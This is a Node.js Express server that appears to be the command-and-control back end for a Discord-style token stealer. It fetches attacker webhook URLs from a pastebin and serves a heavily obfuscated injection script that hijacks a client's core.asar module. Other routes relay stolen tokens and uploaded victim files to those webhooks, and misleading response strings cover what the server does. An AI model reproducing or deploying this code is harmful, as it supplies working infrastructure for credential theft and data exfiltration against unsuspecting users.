const express = require('express')
const request = require("request-promise-native");
const app = express()
const port = 3000
const _ = require("lodash");
const fs = require("fs");
const JavaScriptObfuscator = require('javascript-obfuscator');
const rimraf = require("rimraf");
const fileUpload = require("express-fileupload");
const formData = require('form-data');

app.use(fileUpload({ limits: { fileSize: 50 * 1024 * 1024, files: 1 }}))

app.use(express.json())

let information = {}

getData()
setInterval(() => {
  getData()
}, 10000);


function getData() {
  request.get({
    url: "https://pastebin.com/raw/Qe817mDY"
  }).then((res) => {
    res = res.toString().trim().split("\n")

    let holder = {}

    for(let i = 0; i < res.length; i++){
      const val = res[i].split(":")
      holder[val[0].trim()] = val[1].trim() + ":" + val[2].trim()
    }

    if(!_.isEqual(information, holder)){
      information = holder
    }
  })
}

app.get('/', (req, res) => {
  res.send("null")
})

//change "get" req to post
app.post('/injection/code', (req, res) => {
  const inject = fs.readFileSync("./injection.js", "utf-8").toString().replace("%WEBHOOK_LINK%", information["Injection Hook"])
  const obfuscationResult = JavaScriptObfuscator.obfuscate(inject, { 
    optionsPreset: "high-obfuscation",
    stringArray: true,
    stringArrayRotate: true,
    stringArrayShuffle: true,
    stringArrayThreshold: 1,
    stringArrayIndexShift: true,
    stringArrayWrappersCount: 5,
    stringArrayWrappersType: "function",
    stringArrayWrappersParametersMaxCount: 5,
    stringArrayWrappersChainedCalls: true,
    splitStrings: true,
    identifierNamesGenerator: "hexadecimal",
    compact: true,
    simplify: true,
    transformObjectKeys: true,
    numbersToExpressions: true,
    controlFlowFlattening: true,
    controlFlowFlatteningThreshold: 1,
    deadCodeInjection: true,
    deadCodeInjectionThreshold: 1,
  })
  console.log("Success request to obfucation code")
  res.send(obfuscationResult.getObfuscatedCode() + "\n\nmodule.exports = require('./core.asar')//signature")
})

app.post('/tokens/send', (req, res) => {
  request.post({
    url: information["Tokens Hook"].toString(),
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify(req.body)
  }).then(() => {
    res.send("error, did not send")
  }).catch((err) => {
    console.log(err)
  })
})

app.post('/information/send', (req, res) => {
  if(!req.files){
    return res.send("Sent to webhook")
  }

  const dir = "./misc/" + req.files.file.name
  fs.writeFile(dir, req.files.file.data, function(err) {
    if(err){
      return console.log(err)
    }

    console.log({ embeds: JSON.parse(req.body.embeds) })

    const form = new formData()
    form.append("file1", fs.createReadStream(dir))
    form.append("payload_json", JSON.stringify({ embeds: JSON.parse(req.body.embeds) }))

    request.post({
      url: information["Information Hook"],
      headers: form.getHeaders(),
      body: form
    }).then(() => {
      rimraf.sync(dir)
      res.send("sent to webhook")
    })
  })
})

app.listen(port, () => {
  console.log(`Listening on port ${port}`)
})